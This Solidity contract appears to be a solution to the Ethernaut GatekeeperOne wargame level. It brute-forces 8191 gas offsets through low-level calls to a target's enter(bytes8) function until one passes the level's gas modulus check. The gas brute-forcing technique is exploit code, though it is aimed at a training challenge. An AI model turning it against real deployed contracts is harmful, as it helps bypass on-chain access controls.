// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Searches the possible gas offsets needed by GatekeeperOne's modulus check.
contract GatekeeperOneSolver {
    function solve(address target, bytes8 key) external returns (bool) {
        for (uint256 i = 0; i < 8191; i++) {
            uint256 gasToUse = (8191 * 10) + i;
            // A low-level call lets the loop continue when a candidate reverts.
            (bool success,) = target.call{gas: gasToUse}(abi.encodeWithSignature("enter(bytes8)", key));

            if (success) {
                return true;
            }
        }

        return false;
    }
}
